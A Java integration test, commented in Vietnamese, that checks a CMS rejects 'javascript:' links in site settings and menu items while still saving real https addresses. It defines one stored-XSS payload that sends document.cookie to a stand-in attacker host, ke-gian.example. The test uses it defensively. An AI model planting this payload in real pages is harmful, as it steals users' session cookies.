package com.songnhue.app.cms;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.JdbcTemplate;

import com.songnhue.app.testsupport.IntegrationTestBase;
import com.songnhue.app.testsupport.PhienHttp;

/**
 * <b>{@code javascript:} ⛔ được VÀO CSDL</b> — T63.4, vế ghi của T61.34 (ASVS 5.3.3).
 *
 * <h2>Vì sao bài này phải đi qua HTTP</h2>
 *
 * Luật 5. Cam kết nằm ở {@code MenuService} và {@code SettingValidator}, nhưng thứ quyết định người
 * quản trị có lưu được hay ⛔ là <b>cả đường</b>: DTO → controller → service → {@code value_type}
 * trong CSDL. Gọi thẳng service bỏ qua đúng mắt xích hay hỏng nhất — khoá nào mang kiểu {@code URL}.
 *
 * <h2>Hai vế, và vế thứ hai mới là vế khó</h2>
 *
 * <ul>
 *   <li>Vế <b>chặn</b>: gửi {@code javascript:…} ⇒ phải bị từ chối kèm mã lỗi đọc được.
 *   <li>Vế <b>⛔ chặn nhầm</b>: gửi một địa chỉ thật ⇒ phải lưu được. Thiếu vế này thì một bản vá
 *       *"từ chối tất"* cũng xanh, và nó sẽ khoá chết màn hình cấu hình của Công ty (luật 9).
 * </ul>
 */
class DiaChiLienKetChanLucGhiHttpTest extends IntegrationTestBase {

    private static final String DOC_HAI = "javascript:fetch('//ke-gian.example/?c='+document.cookie)";

    @Autowired
    private com.songnhue.app.testsupport.TestHttp http;

    @Autowired
    private JdbcTemplate jdbc;

    @Autowired
    private com.songnhue.core.infra.identity.UserRepository users;

    @Autowired
    private com.songnhue.core.application.auth.PasswordPolicyService passwords;

    private PhienHttp phienHttp;

    @org.junit.jupiter.api.BeforeEach
    void dungPhien() {
        // ⚠ `PhienHttp` ⛔ phải bean — mọi lớp kiểm HTTP tự dựng nó từ `TestHttp`.
        //   Dựng ở `@BeforeEach` chứ ⛔ `@BeforeAll`: mỗi thực thể cấp một IP giả riêng
        //   (`PhienHttp.doiIp`), mà dùng chung một IP cho cả lớp là cách T60.9 làm ba bài
        //   vô can đỏ vì cạn hạn mức giữa chừng.
        phienHttp = new PhienHttp(http);
    }

    @Test
    @DisplayName("⭐⭐ Khoá `settings` đi vào href từ chối `javascript:` — và CSDL ⛔ giữ lại gì")
    void settingsTuChoiJavascript() {
        PhienHttp.Phien phien = phienHttp.dangNhap(nguoiDungCoQuyen("adm:setting:update"));

        ResponseEntity<String> tl = phienHttp.goi(
                phien,
                HttpMethod.PUT,
                "/api/v1/settings/site.footer.social.facebook",
                "{\"value\":\"%s\"}".formatted(DOC_HAI));

        assertThat(tl.getStatusCode())
                .as("Lượt ghi phải bị từ chối, thân trả về: %s", tl.getBody())
                .isEqualTo(HttpStatus.UNPROCESSABLE_CONTENT);
        assertThat(tl.getBody()).contains("ADM-2006");

        // ⛔ Chỉ hỏi mã HTTP là chưa đủ: một lượt ghi có thể vừa lưu vừa trả lỗi ở bước sau. Câu hỏi
        //    thật sự của dòng nợ này là *"chuỗi xấu có vào bảng ⛔"*, nên phải hỏi chính cái bảng.
        String daLuu = jdbc.queryForObject(
                "SELECT coalesce(setting_value, '') FROM settings WHERE setting_key = 'site.footer.social.facebook'",
                String.class);
        assertThat(daLuu).doesNotContain("javascript:");
    }

    @Test
    @DisplayName("Một địa chỉ THẬT vẫn lưu được — bản vá ⛔ được khoá chết màn hình cấu hình")
    void settingsVanNhanDiaChiThat() {
        PhienHttp.Phien phien = phienHttp.dangNhap(nguoiDungCoQuyen("adm:setting:update"));

        ResponseEntity<String> tl = phienHttp.goi(
                phien,
                HttpMethod.PUT,
                "/api/v1/settings/site.footer.social.facebook",
                "{\"value\":\"https://www.facebook.com/thuyloisongnhue\"}");

        assertThat(tl.getStatusCode().is2xxSuccessful())
                .as("thân: %s", tl.getBody())
                .isTrue();

        String daLuu = jdbc.queryForObject(
                "SELECT setting_value FROM settings WHERE setting_key = 'site.footer.social.facebook'", String.class);
        assertThat(daLuu).isEqualTo("https://www.facebook.com/thuyloisongnhue");
    }

    @Test
    @DisplayName("⭐⭐ Mục menu ⛔ lưu được `javascript:` — mã riêng `CMS-2024`, ⛔ phải `CMS-2012`")
    void menuTuChoiJavascript() {
        PhienHttp.Phien phien = phienHttp.dangNhap(nguoiDungCoQuyen("cms:layout:manage"));

        ResponseEntity<String> tl = phienHttp.goi(
                phien,
                HttpMethod.POST,
                "/api/v1/cms/menus/HEADER",
                """
                {"label":"Liên kết ngoài","linkType":"URL","url":"%s","openNewTab":false,"active":true}"""
                        .formatted(DOC_HAI));

        assertThat(tl.getStatusCode()).as("thân: %s", tl.getBody()).isEqualTo(HttpStatus.UNPROCESSABLE_CONTENT);

        // Mã riêng chứ ⛔ dùng lại `CMS-2012` (*"đích ⛔ tồn tại hoặc đã bị xoá"*): hai câu ấy dẫn
        // người quản trị đi hai hướng khác hẳn nhau. Một người vừa dán nhầm địa chỉ mà đọc được
        // *"đích ⛔ tồn tại"* sẽ đi tìm xem mình xoá mất danh mục nào.
        assertThat(tl.getBody()).contains("CMS-2024");

        Integer conLai =
                jdbc.queryForObject("SELECT count(*) FROM menu_items WHERE url LIKE 'javascript:%'", Integer.class);
        assertThat(conLai)
                .as("⛔ hàng nào mang javascript: được phép nằm trong menu_items")
                .isZero();
    }

    @Test
    @DisplayName("Mục menu với địa chỉ https bình thường vẫn tạo được")
    void menuVanNhanDiaChiThat() {
        PhienHttp.Phien phien = phienHttp.dangNhap(nguoiDungCoQuyen("cms:layout:manage"));

        ResponseEntity<String> tl = phienHttp.goi(
                phien,
                HttpMethod.POST,
                "/api/v1/cms/menus/HEADER",
                """
                {"label":"Cổng Chính phủ","linkType":"URL","url":"https://chinhphu.vn",\
                "openNewTab":false,"active":true}""");

        assertThat(tl.getStatusCode().is2xxSuccessful())
                .as("thân: %s", tl.getBody())
                .isTrue();
    }

    /**
     * Người dùng mang ĐÚNG một mã quyền cần cho phép thử.
     *
     * <p>⛔ Dùng {@code superadmin}: tài khoản ấy ⛔ đăng nhập được bằng mật khẩu mặc định trong bộ
     * kiểm, và quan trọng hơn — một bài kiểm chạy dưới quyền tối cao ⛔ phân biệt được *"bản vá chặn
     * đúng"* với *"người này vốn ⛔ được phép"*.
     */
    private String nguoiDungCoQuyen(String quyen) {
        String username = PhienHttp.taoNguoiDung(users, passwords, jdbc, "t634_" + quyen.replaceAll("[^a-z]", ""));
        jdbc.update("INSERT INTO roles (code, name) VALUES ('T634_PROBE', 'Vai trò kiểm thử T63.4') "
                + "ON CONFLICT DO NOTHING");
        jdbc.update(
                "INSERT INTO role_permissions (role_id, permission_id) "
                        + "SELECT r.id, p.id FROM roles r, permissions p "
                        + "WHERE r.code = 'T634_PROBE' AND p.code = ? ON CONFLICT DO NOTHING",
                quyen);
        jdbc.update(
                "INSERT INTO user_roles (user_id, role_id) "
                        + "SELECT u.id, r.id FROM users u, roles r "
                        + "WHERE u.username = ? AND r.code = 'T634_PROBE' ON CONFLICT DO NOTHING",
                username);
        return username;
    }
}
